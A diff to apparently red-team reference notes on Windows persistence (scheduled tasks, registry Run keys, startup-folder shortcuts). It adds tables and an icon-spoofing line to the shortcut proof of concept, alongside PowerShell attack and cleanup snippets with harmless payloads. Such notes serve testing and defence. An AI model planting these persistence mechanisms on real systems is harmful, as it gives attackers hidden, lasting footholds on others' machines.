@@ -4,6 +4,10 @@
 
 ## T1053.005 - Scheduled Task/Job: Scheduled Task
 
+| Privileges | Execution Trigger                    |
+|------------|--------------------------------------|
+| Standard   | Scheduled time if user is logged in. |
+
 - Execute `$cmd` every minute.
     - Attack:
         ```ps1
@@ -17,7 +21,11 @@
 
 ## T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
 
-- Execute `$cmd` (via registry run key) when current user logins.
+| Privileges | Execution Trigger |
+|------------|-------------------|
+| Standard   | User login.       |
+
+- Execute `$cmd` (via registry run key).
     - Attack:
         ```ps1
         $cmd = "PowerShell -NoExit -Command REG QUERY HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -28,11 +36,11 @@
         REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /F /V poc
         ```
 
-- Execute `$cmd` (via startup folder) when current user logins.
+- Execute `$cmd` (via startup folder).
     - Attack:
         ```ps1
         $cmd = "Explorer $env:HOMEPATH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-        $cmds = $cmd -split ' ', 2 ; $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\poc.lnk") ; $lnk.TargetPath = $cmds[0] ; $lnk.Arguments = $cmds[1] ; $lnk.Save()
+        $cmds = $cmd -split ' ', 2 ; $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\poc.lnk") ; $lnk.TargetPath = $cmds[0] ; $lnk.Arguments = $cmds[1] ; $lnk.IconLocation = "$env:SystemDrive\Windows\System32\wsl.exe" ; $lnk.Save()
         ```
     - Cleanup:
         ```ps1
@@ -42,4 +50,4 @@
 ## Resources
 
 - [Mitre ATT&CK | Persistence](https://attack.mitre.org/tactics/TA0003/)
-- [Red Team Notes | Persistence](https://dmcxblue.gitbook.io/red-team-notes/persistence/)
+- [Red Team Notes | Persistence](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/)
